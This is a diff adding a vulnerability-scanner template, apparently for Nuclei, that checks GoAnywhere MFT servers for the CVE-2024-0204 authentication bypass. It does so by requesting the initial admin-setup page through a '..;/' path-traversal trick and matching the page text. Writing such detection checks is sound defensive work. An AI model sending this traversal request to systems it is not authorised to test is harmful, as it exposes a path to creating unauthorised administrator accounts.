@@ -1,0 +1,24 @@
+id: goanywhere-mft-authentication-bypass
+info:
+  name: GoAnywhere MFT Authentication Bypass (CVE-2024-0204)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CVE-2024-0204,auth-bypass
+  description: |
+    This template identifies an authentication bypass vulnerability in GoAnywhere MFT (CVE-2024-0204).
+http:
+  - raw:
+      - |
+        GET /goanywhere/images/..;/wizard/InitialAccountSetup.xhtml HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Create an administrator account"
+          - "GoAnywhere"
+          - "Confirm Password"
